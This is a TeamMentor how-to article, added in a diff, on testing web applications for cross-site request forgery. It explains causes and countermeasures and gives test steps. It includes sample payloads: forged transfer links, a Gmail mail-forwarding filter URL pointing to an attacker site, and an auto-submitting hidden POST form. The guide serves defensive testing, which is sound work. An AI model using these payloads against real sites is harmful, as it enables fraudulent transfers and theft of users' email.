@@ -1,0 +1,434 @@
+<?xml version="1.0"?>
+<TeamMentor_Article Metadata_Hash="-353162122" Content_Hash="2080573553">
+  <Metadata>
+    <Id>c1efdb35-51e1-4f98-89bd-f50f79ede641</Id>
+    <Id_History>5ef2adc6-defb-462f-bfdd-a7bf2ccdd82c,</Id_History>
+    <Library_Id>92718d53-36b2-47bc-b6f5-e60994385f46</Library_Id>
+    <Title>How to Test for Cross-Site Request Forgery (CSRF) Bugs</Title>
+    <Category>Session Management</Category>
+    <Phase>Test</Phase>
+    <Technology>Web Application</Technology>
+    <Type>How To</Type>
+    <DirectLink>How to Test for Cross-Site Request Forgery (CSRF) Bugs</DirectLink>
+    <Tag />
+    <Security_Demand />
+    <Author />
+    <Priority>Andres De Vivanco</Priority>
+    <Status />
+    <Source>SI</Source>
+  </Metadata>
+  <Content Sanitized="true" DataType="Html">
+    <Data><![CDATA[<h1>
+    <span>Applies to:</span>
+  </h1>
+  <ul>
+    <li>
+      <span>Web applications written in languages such as Java, C#, VB .Net, PHP, and Ruby.</span>
+    </li>
+  </ul>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <h1>
+    <span>Summary</span>
+  </h1>
+  <p>
+    <span>During Cross-Site Request Forgery (CSRF) -also known as <i>XSRF</i> or <i>session riding</i>- attacks, an attacker forces a victim to make an unexpected web request such as a fraudulent bank transaction.<span>&amp;nbsp;&amp;nbsp; </span>For example, an attacker tricks the victim client into calling a banking function in a vulnerable page that transfers money from the victim’s to the attacker’s account.<span>&amp;nbsp; </span>The victim triggers the attack by following an attacker’s link or visiting an attacker’s page.<span>&amp;nbsp; </span>The vulnerable server page doesn’t recheck the authenticity of the victim’s request and allows the transfer to proceed.</span>
+  </p>
+  <p>
+    <span>Follow these steps to test for CSRF bugs:</span>
+  </p>
+  <ul>
+    <li>
+      <span>Step 1:<span>&amp;nbsp; </span>Understand Attack Scenarios</span>
+      <li>
+        <span>Step 2:<span>&amp;nbsp; </span>Analyze Causes and Countermeasures</span>
+        <li>
+          <span>Step 3:<span>&amp;nbsp; </span>Start Testing and Exploring</span>
+          <li>
+            <span>Step 4:<span>&amp;nbsp; </span>Fine-tune Test Cases</span>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <h1>
+    <span>Step 1:<span>&amp;nbsp; </span>Understand Attack Scenarios</span>
+  </h1>
+  <p>
+    <span>The first step in testing for CSRF bugs is to understand its attack scenarios.<span>&amp;nbsp; </span>Even though the anatomy of a CSRF attack is almost always constant, its objectives may vary:<span>&amp;nbsp; </span>attackers can exploit CSRF bugs to perform unauthorized fraudulent banking transactions, send spoofed email messages, steal sensitive information, and even install a back door.<span>&amp;nbsp; </span>The following steps detail the anatomy of a CSRF attack:</span>
+  </p>
+  <ol>
+    <li>
+      <span>Attacker finds functionality in a web application that is vulnerable to CSRF.</span>
+      <li>
+        <span>Attacker builds a link invoking the vulnerable function and passing the required parameters as to executed the chosen attack.</span>
+        <li>
+          <span>Attacker waits until the victim client authenticates with the vulnerable web application.</span>
+          <li>
+            <span>Attacker tricks victim client into following the malicious link.</span>
+            <li>
+              <span>Victim client sends forged request to vulnerable server.</span>
+              <li>
+                <span>Vulnerable server allows and executes the forged request. </span>
+              </li>
+            </li>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>The form of the link built in step 2 depends on the payload that the attacker wants to execute.<span>&amp;nbsp; </span>For example, the link might looks like this when they payload is to transfer money from the victim’s to the attacker’s account:</span>
+  </p>
+  <pre>
+    <strong>
+      <span>
+        <a>/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'</a>
+      </span>
+    </strong>
+    <span>&amp;nbsp;</span>
+  </pre>
+  <p>
+    <span>The link below sends an email titled </span>
+    <span>Hello</span>
+    <span> to </span>
+    <span>johny@example.com</span>
+    <span>: </span>
+  </p>
+  <pre>
+    <strong>
+      <span>/sendMail?to=johny@example.com&amp;title=Hello&amp;body=I+did+not+send+this'</span>
+      <span>
+      </span>
+    </strong>
+  </pre>
+  <p>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>A serious flaw discovered in Google’s Gmail early in 2007 allowed attackers to install a backdoor to forward all emails to them.<span>&amp;nbsp; </span>In the link below the attacker forwards the victim to the attacker’s site.<span>&amp;nbsp; </span>Then the attacker’s site makes the fraudulent request in behalf of the victim:</span>
+  </p>
+  <pre>
+    <span>
+      <strong>http://www.attakersite.org/util/csrf?method=POST&amp;enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;cf2emc=true&amp;cf2_email=attacker@attackersite.com&amp;cf1_from&amp;cf1_to&amp;cf1_subj&amp;cf1has&amp;cf1hasnot&amp;cf1attach=true&amp;tfi&amp;s=z&amp;irf=on&amp;nvpbucftb=Create%20Filter</strong>
+    </span>
+  </pre>
+  <p>
+    <span>Upon receiving the forged HTTP POST request, Gmail forwards all the victim’s emails to </span>
+    <span>attacker@attackersite.com</span>
+    <span>.</span>
+    <span>
+      <span>&amp;nbsp; </span>Furthermore, the attack installs a filter that works as a backdoor for hijacking future emails.</span>
+  </p>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <h1>
+    <span>Step 2:<span>&amp;nbsp; </span>Analyze Causes and Countermeasures</span>
+  </h1>
+  <p>
+    <span>During this step you will be shown the causes behind Cross-Site Request Forgery , <span>&amp;nbsp;</span>how to recognize it within your code base and you will be shown coding best practices, as to avoid this issue altogether.</span>
+  </p>
+  <h2>
+    <span>
+      <em>Cross-Site Request Forgery Causes</em>
+    </span>
+  </h2>
+  <p>
+    <span>This kind of vulnerability exists because the web application trusts the forged request.<span>&amp;nbsp; </span>Thus, the cause for this bug is a case of poor or missing authentication code.<span>&amp;nbsp; </span>The application lacks the functionality to verify that every client request is not forged and that it actually originates from a legitimate client action.<span>&amp;nbsp;&amp;nbsp; </span>Web applications vulnerable to CSRF implement a <i>persistent</i> authentication system in which they validate the user against a persistent token such as a session cookie.<span>&amp;nbsp;&amp;nbsp; </span>In persistent authentication, when the server receives a request it only checks if the user is logged in and not if the request comes due to a legitimate client action.</span>
+  </p>
+  <h2>
+    <span>
+      <em>Cross-Site Request Forgery Countermeasures</em>
+    </span>
+  </h2>
+  <p>
+    <span>The main prevention against CSRF vulnerabilities is to provide a <i>transient</i> authentication system [i] instead of a persistent authentication system.<span>&amp;nbsp; </span>Transient authentication systems verify for the authenticity of every request by using an additional check.<span>&amp;nbsp;&amp;nbsp; </span>One way of doing this is to transmit a secret in every URL; especially require a secret in URLs that request create, update, delete, or mail actions.<span>&amp;nbsp; </span>An attacker will not be able to execute an attack unless he knows the secret.<span>&amp;nbsp; </span>The problem is that an attacker can execute a XSS attack and steal the secret.</span>
+  </p>
+  <p>
+    <span>There is no silver bullet against CSRF attacks so developers need to look for ways of raising the bar against attackers.<span>&amp;nbsp;&amp;nbsp; </span>A popular way to protect Internet users from CSRF is by using <i>CAPTCHAs</i> (Completely Automated Turing Test to Test Computers and Humans Apart) that require the client to validate the contents of a bitmap image before the application allows any requests.</span>
+  </p>
+  <p>
+    <span>Other preventions suggested include using POSTs instead of GETs requests to perform actions and or to check the HTTP referrer header.<span>&amp;nbsp; </span>However, both of these countermeasures can be defeated by a knowledgeable attacker since he can easily forge a POST command using a malicious script and can also easily spoof the HTTP referrer.<span>&amp;nbsp; </span></span>
+  </p>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <h1>
+    <span>Step 3:<span>&amp;nbsp; </span>Start Testing and Exploring</span>
+  </h1>
+  <p>
+    <span>Now that you’ve learned how CSRF attacks work and how to defend against them, this step shows the basic test cases to execute to start testing for CSRF bugs.</span>
+  </p>
+  <p>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>Basic Test for Cross-site Request Forgery </em>
+    </span>
+  </h2>
+  <p>
+    <span>Follow these test steps to test against CSRF bugs. </span>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <ol>
+    <li>
+      <span>Find a web application page that performs an action based on a user request.</span>
+      <li>
+        <span>Construct a page containing a link or redirect that sends a forged request to the application server.<span>&amp;nbsp; </span>This link usually contains a tag such as an </span>
+        <span>img</span>
+        <span> or </span>
+        <span>iframe</span>
+        <span> (although mostly any tags can be used) with the source address pointing to the request:</span>
+        <ul>
+          <li>
+            <span>
+              <pre>
+                <span>&lt;a href="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"&gt;View my Pictures!&lt;/a&gt;</span>
+              </pre>
+              <pre>
+                <span>
+                </span>
+              </pre>
+              <pre>
+                <span>&lt;img src="http://bank.com/transfer.do?acct=MARIA&amp;amount=100000" width="1" height="1" border="0"&gt;</span>
+                <span>&amp;nbsp;</span>
+              </pre>
+              <p>
+                <span>Note that the links above will both generate a GET request.<span>&amp;nbsp; </span>In order to test for POST requests you must create a page containing a form with the URL parameters passed as hidden input, and add a script to automatically submit the form:</span>
+                <span>&amp;nbsp;</span>
+              </p>
+              <pre>
+                <span>&lt;form action="http://bank.com/transfer.do" method="post"&gt;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;input type="hidden" name="acct" value="MARIA"&gt;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;input type="hidden" name="ammount" value="100000"&gt;<br />&lt;/form&gt; <br />&lt;script&gt;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; document.forms[0].submit();<br />&lt;/script&gt;<br /></span>
+              </pre>
+            </span>
+          </li>
+        </ul>
+        <span>
+          <li>
+            <span>Open an Internet browser and log in to the web application as a legitimate user.</span>
+            <li>
+              <span>Open the page built in step 2 (follow the link if necessary).</span>
+              <li>
+                <span>Confirm if the request was successful.</span>
+                <li>
+                  <span>Repeat test case for every application create/update/delete/mail action.</span>
+                </li>
+              </li>
+            </li>
+          </li>
+        </span>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>Expected result:<span>&amp;nbsp; </span>the test fails if the application trusts and processes the forged request.</span>
+  </p>
+  <h2>
+    <span>
+      <em>Test Use of Secret in URLs</em>
+    </span>
+  </h2>
+  <p>
+    <span>This test will tell you if your application uses secrets in the URL.</span>
+  </p>
+  <p>
+    <span>Testing steps:</span>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <ol>
+    <li>
+      <span>Log in to the application as a legitimate user.</span>
+      <li>
+        <span>Browse to a web form that makes a valid request and uses a secret in the URL:<span>&amp;nbsp; </span></span>
+        <span>
+          <span>
+            <ul>
+              <li>
+                <span>
+                  <pre>
+                    <span>http://example.com/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'&amp;<span>secret=2y9ryo2hr2</span></span>
+                  </pre>
+                </span>
+              </li>
+            </ul>
+            <li>
+              <span>Start intercepting network traffic using HTTP(s) WebScarab<a style="mso-endnote-id: edn2" title="" href="about:blank#_edn2" name="_ednref2"><span><span><span><span>[ii]</span></span></span></span></a> proxy.</span>
+              <li>
+                <span>Configure browser to use WebScarab proxy.</span>
+                <li>
+                  <span>Make another request.</span>
+                  <li>
+                    <span>In WebScarab, modify the URL to change the secret to another value:</span>
+                    <ul>
+                      <li>
+                        <pre>
+                          <span>
+                          </span>
+                        </pre>
+                      </li>
+                    </ul>
+                  </li>
+                </li>
+              </li>
+            </li>
+          </span>
+        </span>
+        <span>http://example.com/makeTransfer?amount=1000&amp;dest=attacker@attackersite.com'&amp;<span>secret=</span><span><strong>XXXXXXXXXXX</strong></span></span>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>Expected result:<span>&amp;nbsp; </span>The server must disallow the action since the secret was changed in step 6.<span>&amp;nbsp; </span>The test fails if the server allows the requested action.</span>
+    <span>
+    </span>
+  </p>
+  <p>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>Test Use of Secret in Cookies</em>
+    </span>
+  </h2>
+  <p>
+    <span>This test will tell you if your application properly uses secrets in the cookies.</span>
+  </p>
+  <p>
+    <span>Testing steps:</span>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <ol>
+    <li>
+      <span>Start intercepting traffic network traffic using WebScarab proxy.</span>
+      <li>
+        <span>Open a browser, configure it to go through WebScarab proxy, and log in to the application as a legitimate user.</span>
+        <li>
+          <span>Browse to a page that makes a request and submits a secret using a cookie.</span>
+          <li>
+            <span>Submit request.</span>
+            <li>
+              <span>In WebScarab, replace the secret in the cookie.<span>&amp;nbsp; </span>For instance: </span>
+            </li>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <blockquote>
+    <pre>
+      <span>GET http://www.example.com/trasnfer?amount=1000&amp;dest=1234 HTTP/1.1<br />Host: localhost<br />User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14<br />Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br />Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3<br />Accept-Encoding: gzip,deflate<br />Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br />Keep-Alive: 300<br />Proxy-Connection: keep-alive<br />Cookie: session-ID=1089eq14; secret=1240u9309u2efija<strong>XXXX</strong><br />&amp;nbsp;</span>
+    </pre>
+  </blockquote>
+  <p>
+    <span>Expected result:<span>&amp;nbsp; </span>The server must disallow the action since the secret was changed in step 6.<span>&amp;nbsp; </span>The test fails if the server allows the requested action.</span>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <h1>
+    <span>Step 4:<span>&amp;nbsp; </span>Fine-tune Test Case Data</span>
+  </h1>
+  <p>
+    <span>The final step in testing for CSRF bugs is to fine-tune the test case data to achieve proper test coverage.<span>&amp;nbsp; </span><span>&amp;nbsp;</span>Testing for CSRF bugs require you to fine-tune the test case data as to cover different attack scenarios in an automated fashion.</span>
+  </p>
+  <h2>
+    <span>
+      <em>Fine-tune Test Case Data per objective</em>
+    </span>
+  </h2>
+  <p>
+    <span>Attackers can use CSRF bugs to execute different kinds of attacks.<span>&amp;nbsp; </span>It is important that you test these different payloads depending the characteristics of your application. Common objectives of <span>&amp;nbsp;</span>CSRF attacks include:</span>
+  </p>
+  <ul>
+    <li>
+      <span>Making a fraudulent bank transaction.</span>
+      <li>
+        <span>Sending spoofed email.</span>
+        <li>
+          <span>Exploiting an administrative application.</span>
+          <li>
+            <span>Forcing password resets.</span>
+            <li>
+              <span>Changing router and firewall configurations [iii].</span>
+            </li>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <h2>
+    <span>
+      <em>Automate test cases </em>
+    </span>
+  </h2>
+  <p>
+    <span>Finally, it is recommended that you extend your test automation by adding CSRF test cases to it.<span>&amp;nbsp; </span>Make a list of all GET requests in URLs and POST requests and write your own script that makes the requests with different session tokens.<span>&amp;nbsp; </span></span>
+  </p>
+  <h1>
+    <span>
+    </span>&amp;nbsp;</h1>
+  <h1>
+    <span>Conclusions</span>
+  </h1>
+  <p>
+    <span>Cross-Site Request Forgery is serious attack class that affects any web application that doesn’t explicitly protect against it.<span>&amp;nbsp; </span>Testing for CSRF bugs requires you to understand the attack scenarios, the cause of the bugs, and how to defend against them.<span>&amp;nbsp;&amp;nbsp; </span>In addition you must execute different CSRF test cases and fine-tune test case data according to different entry points.</span>
+  </p>
+  <p>
+    <span>&amp;nbsp;</span>
+  </p>
+  <p>[i] <span><b>Cross-Site Request Forgery</b>.<span>&amp;nbsp; </span>Wikiepedia. <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></span></p>
+  <div>
+    <div>
+      <p>
+        <a style="mso-endnote-id: edn2" title="" href="about:blank#_ednref2" name="_edn2">
+        </a>[ii] <span><b>Session Riding -<span>&amp;nbsp; </span>A Widespread Vulnerability in Today Web Applications. </b>Thomas Scheiber, SecureNet GmbH, Dec 2004. <a href="http://www.securenet.de/papers/Session_Riding.pdf">http://www.securenet.de/papers/Session_Riding.pdf</a></span></p>
+    </div>
+    <div>
+      <p>
+        <span>&amp;nbsp;</span>
+      </p>
+    </div>
+  </div>]]></Data>
+  </Content>
+</TeamMentor_Article>
